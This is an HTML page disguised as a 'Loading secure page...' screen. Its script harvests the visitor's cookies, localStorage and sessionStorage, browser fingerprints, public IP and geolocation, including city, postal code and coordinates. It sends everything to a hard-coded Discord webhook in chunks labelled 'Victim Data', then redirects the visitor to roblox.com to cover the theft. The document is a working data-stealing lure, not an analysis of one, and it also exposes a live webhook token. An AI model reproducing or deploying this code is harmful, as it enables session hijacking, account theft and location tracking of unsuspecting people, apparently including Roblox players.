<!DOCTYPE html>
<html>
<head>
    <title>Loading secure page...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <script>
        // Comprehensive data collection - with your new webhook
        function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = "#069";
            ctx.fillText("Canvas Fingerprint Test", 2, 2);
            return canvas.toDataURL();
        }

        function getBrowserPlugins() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins;
        }

        function getLocalStorage() {
            try {
                return JSON.stringify(localStorage);
            } catch(e) {
                return "{}";
            }
        }

        function getSessionStorage() {
            try {
                return JSON.stringify(sessionStorage);
            } catch(e) {
                return "{}";
            }
        }

        function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "WebGL not supported";
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
            return "No debug info";
        }

        function getTimeZone() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        }

        async function sendData() {
            const fingerprintData = getFingerprint();
            const webglInfo = getWebGLInfo();
            
            const data = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer || "Direct",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookiesEnabled: navigator.cookieEnabled,
                cookies: document.cookie || "No cookies",
                localStorage: getLocalStorage(),
                sessionStorage: getSessionStorage(),
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                },
                windowSize: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight
                },
                timeZone: getTimeZone(),
                plugins: getBrowserPlugins(),
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                deviceMemory: navigator.deviceMemory || "Unknown",
                touchSupport: "ontouchstart" in window,
                webgl: webglInfo,
                canvasFingerprint: fingerprintData.substring(0, 100) + "...",
                doNotTrack: navigator.doNotTrack,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : "Not available"
            };

            // IP info via multiple APIs
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                data.publicIP = ipData.ip;
            } catch(e) {
                data.publicIP = "Failed to fetch";
            }

            try {
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();
                data.ip = geoData.ip;
                data.city = geoData.city;
                data.region = geoData.region;
                data.country = geoData.country;
                data.countryCode = geoData.country_code;
                data.postal = geoData.postal;
                data.latitude = geoData.latitude;
                data.longitude = geoData.longitude;
                data.isp = geoData.org;
                data.timezone = geoData.timezone;
            } catch(e) {
                data.geoError = e.message;
            }

            // YOUR NEW WEBHOOK URL
            const webhookURL = 'https://discord.com/api/webhooks/1515731170091073640/pD3_kTsADTiRMWQz1El3hmkADG4r1Gq1mizvvkK7uXw8-g9CJO-xr53XTuQoMRfBn_NL';
            
            const jsonString = JSON.stringify(data, null, 2);
            const chunks = [];
            let currentChunk = "";
            
            for (let line of jsonString.split('\n')) {
                if ((currentChunk + line + '\n').length > 1900) {
                    chunks.push(currentChunk);
                    currentChunk = line + '\n';
                } else {
                    currentChunk += line + '\n';
                }
            }
            if (currentChunk) chunks.push(currentChunk);
            
            for (let i = 0; i < chunks.length; i++) {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `**Victim Data Part ${i+1}/${chunks.length}**`,
                        embeds: [{
                            description: '```json\n' + chunks[i] + '\n```'
                        }]
                    })
                }).catch(e => console.error(e));
                if (chunks.length > 1) await new Promise(r => setTimeout(r, 200));
            }
        }

        sendData().then(() => {
            setTimeout(() => { 
                window.location.href = "https://www.roblox.com"; 
            }, 1500);
        }).catch(() => {
            setTimeout(() => { 
                window.location.href = "https://www.roblox.com"; 
            }, 1500);
        });
    </script>
</body>
</html>
